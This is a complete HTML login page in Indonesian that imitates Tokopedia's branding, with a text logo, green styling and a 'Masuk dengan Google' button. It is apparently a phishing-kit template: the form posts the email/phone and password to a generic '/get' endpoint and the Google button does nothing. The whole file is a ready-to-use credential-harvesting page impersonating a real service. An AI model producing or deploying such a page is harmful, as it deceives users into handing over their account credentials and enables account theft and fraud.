<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <title>Tokopedia</title>
    <style>
      body {
        font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
        background-color: #f5f5f5;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
      }
      .login-container {
        width: 400px;
        background: #fff;
        border-radius: 8px;
        padding: 40px 32px;
        box-shadow: 0 2px 8px rgba(0,0,0,0.08);
        text-align: center;
      }
      #logo {
        margin-bottom: 20px;
      }
      .g-h1 {
        font-size: 20px;
        font-weight: 600;
        color: #333;
        margin-bottom: 4px;
      }
      .g-h2 {
        font-size: 14px;
        color: #666;
        margin-bottom: 24px;
      }
      .g-input {
        width: 100%;
        padding: 12px 16px;
        border: 1px solid #e0e0e0;
        border-radius: 8px;
        font-size: 14px;
        margin-bottom: 16px;
        box-sizing: border-box;
        outline: none;
      }
      .g-input:focus {
        border-color: #42b549;
      }
      .gbtn-primary {
        width: 100%;
        padding: 12px;
        background-color: #42b549;
        color: #fff;
        border: none;
        border-radius: 8px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
      }
      .gbtn-primary:hover {
        background: #389e40;
      }
      .or {
        display: flex;
        align-items: center;
        margin: 20px 0;
        color: #999;
        font-size: 13px;
      }
      .or::before, .or::after {
        content: '';
        flex: 1;
        border-bottom: 1px solid #e0e0e0;
      }
      .or span {
        padding: 0 12px;
      }
      .social-btn {
        width: 100%;
        padding: 12px;
        background: #fff;
        border: 1px solid #e0e0e0;
        border-radius: 8px;
        font-size: 14px;
        font-weight: 600;
        color: #333;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
        margin-bottom: 12px;
      }
      .social-btn:hover {
        background: #f5f5f5;
      }
      .footer {
        margin-top: 20px;
        font-size: 13px;
        color: #666;
      }
      .footer a {
        color: #42b549;
        text-decoration: none;
        font-weight: 600;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <svg id="logo" viewBox="0 0 120 30" width="120" height="30">
        <text x="50%" y="24" text-anchor="middle" font-family="Arial" font-weight="800" font-size="22" fill="#42b549">tokopedia</text>
      </svg>
      <h1 class="g-h1">Selamat Datang</h1>
      <p class="g-h2">Silakan masuk ke akun Tokopedia Anda</p>
      <form action="/get" method="POST">
        <input class="g-input" type="text" name="email" placeholder="Email / Nomor HP" required>
        <input class="g-input" type="password" name="password" placeholder="Password" required>
        <button type="submit" class="gbtn-primary">Masuk</button>
      </form>
      <div class="or"><span>atau</span></div>
      <button class="social-btn">
        <svg width="18" height="18" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
        Masuk dengan Google
      </button>
      <p class="footer">Belum punya akun? <a href="#">Daftar</a></p>
    </div>
  </body>
</html>
